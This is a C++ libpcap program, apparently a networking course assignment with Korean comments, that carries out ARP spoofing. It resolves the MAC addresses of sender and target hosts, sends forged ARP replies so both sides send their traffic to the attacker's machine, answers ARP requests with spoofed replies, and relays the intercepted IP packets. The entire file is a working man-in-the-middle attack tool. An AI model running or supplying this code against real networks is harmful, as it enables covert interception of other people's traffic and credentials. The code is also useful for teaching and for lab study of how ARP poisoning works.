#include <cstdio>
#include <pcap.h>
#include <string>
#include "ethhdr.h"
#include "iphdr.h"
#include "arphdr.h"
#include "myaddr.h"
#include <map>
#include <vector>
#include <iostream>
#include <map>
using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

void sendARP(pcap_t* handle, Mac eth_dmac, Mac eth_smac, Mac smac, Ip sip, Mac tmac, Ip tip, uint16_t op) {

	EthArpPacket packet;

	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.smac_ = eth_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(op);  // 수정된 부분: op를 활용하여 Request 또는 Reply를 설정

	packet.arp_.smac_ = smac;
	packet.arp_.sip_ = htonl(sip);
	packet.arp_.tmac_ = tmac;
	packet.arp_.tip_ = htonl(tip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

void relay(pcap_t* handle, Mac dmac, Mac smac, const u_char* packet, const pcap_pkthdr* header) {
	u_char *new_packet = new u_char[header->caplen];
	memcpy(new_packet, packet, header->caplen);
	memcpy(new_packet, &dmac, 6);
	memcpy(new_packet + 6, &smac, 6);

	// 패킷 크기 수정
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(new_packet), header->caplen);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	delete[] new_packet;
}

int main(int argc, char* argv[]) {
	if (argc < 4 || (argc % 2) != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	char attackerMAC[18];
	char attackerIP[16];

	getMacAddress(attackerMAC, dev);
	getIpAddress(attackerIP, 16, dev);

	printf("%s\n", attackerMAC);
	printf("%s\n", attackerIP);

	Mac myMAC = Mac(attackerMAC);
	Ip myIP = Ip(attackerIP);

	map<Ip, Mac> senders;
	map<Ip, Mac> targets;
	map<Ip, Ip> sender_target;
	map<Ip, vector<Ip>> target_senders;

	Mac broadcast = Mac("FF:FF:FF:FF:FF:FF");
	Mac who = Mac("00:00:00:00:00:00");

	for (int i = 2; i < argc; i += 2) {
		Ip senderIP = Ip(argv[i]);
		Ip targetIP = Ip(argv[i+1]);
		Mac senderMAC;
		Mac targetMAC;

		sender_target[senderIP] = targetIP;
		target_senders[targetIP].push_back(senderIP);

		// sender MAC 구하기
		sendARP(handle, broadcast, myMAC, myMAC, myIP, who, senderIP, ArpHdr::Request);

		while (true) {
			struct pcap_pkthdr *header;
			const u_char *packet;

			int res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}

			EthHdr *eth = (EthHdr *)packet;
			if (eth->type_ == htons(EthHdr::Arp)) {
				ArpHdr *arp = (ArpHdr *)(packet + sizeof(EthHdr));
				if (arp->op_ == htons(ArpHdr::Reply)) {
					senderMAC = arp->smac_;
					senders[senderIP] = senderMAC;
					break;
				}
			}
		}

		// target MAC 구하기
		sendARP(handle, broadcast, myMAC, myMAC, myIP, who, targetIP, ArpHdr::Request);

		while (true) {
			struct pcap_pkthdr *header;
			const u_char *packet;

			int res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}

			EthHdr *eth = (EthHdr *)packet;
			if (eth->type_ == htons(EthHdr::Arp)) {
				ArpHdr *arp = (ArpHdr *)(packet + sizeof(EthHdr));
				if (arp->op_ == htons(ArpHdr::Reply)) {
					targetMAC = arp->smac_;
					targets[targetIP] = targetMAC;
					break;
				}
			}
		}

		// senders 속이기
		for (const auto& pair : senders) {
			sendARP(handle, pair.second, myMAC, myMAC, sender_target[pair.first], pair.second, pair.first, ArpHdr::Reply);
		}

		// targets 속이기
		for (const auto& pair : targets) {
			for (const auto& senderIP : target_senders[pair.first]) {
				sendARP(handle, pair.second, myMAC, myMAC, senderIP, pair.second, pair.first, ArpHdr::Reply);
			}
		}

		// 패킷 처리 루프
		while (true) {
			struct pcap_pkthdr *header;
			const u_char *packet;

			int res = pcap_next_ex(handle, &header, &packet);
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}

			EthHdr *eth = (EthHdr *)packet;

			// ARP 받았을 때
			if (eth->type_ == htons(EthHdr::Arp)) {
				ArpHdr *arp = (ArpHdr *)(packet + sizeof(EthHdr));

				Mac sourceMAC = arp->smac_;
				Ip sourceIP = Ip(arp->sip());
				Ip targetIP = Ip(arp->tip());

				// request일 때
				if (arp->op_ == htons(ArpHdr::Request)) {
					sendARP(handle, sourceMAC, myMAC, myMAC, targetIP, sourceMAC, sourceIP, ArpHdr::Reply);
					continue;
				}
			}

			// IP 패킷일 때만 처리
			if (eth->type_ != htons(EthHdr::Ip4) && eth->type_ != htons(EthHdr::Ip6))
				continue;

			// IP 패킷 처리
			IpHdr *ip = (IpHdr *)(packet + sizeof(EthHdr));
			Ip srcIP = Ip(ntohl(ip->s_ip.s_addr));
			Ip dstIP = Ip(ntohl(ip->d_ip.s_addr));

			if (senders.count(srcIP) > 0) {
				relay(handle, targets[sender_target[srcIP]], myMAC, packet, header);
			}
			else if (senders.count(dstIP) > 0) {
				relay(handle, senders[dstIP], myMAC, packet, header);
			}
		}
	}
	pcap_close(handle);
	return 0;
}
